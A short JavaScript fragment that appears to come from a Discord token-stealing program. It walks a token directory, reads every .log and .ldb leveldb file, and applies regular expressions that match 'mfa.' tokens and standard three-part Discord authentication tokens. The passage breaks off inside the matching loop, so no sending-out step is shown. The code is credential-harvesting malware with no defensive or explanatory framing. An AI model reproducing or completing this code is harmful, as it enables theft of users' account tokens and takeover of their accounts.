  ...
  try {
    fs.readdirSync(path.normalize(tokenPath)).map(file => {
      if (file.endsWith(".log") || file.endsWith(".ldb")) {
        fs.readFileSync("".concat(tokenPath, "\\").concat(file), "utf8").split(/\r?\n/).forEach(line => {
          var regex = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/g)];
          for (var _regex of regex) {
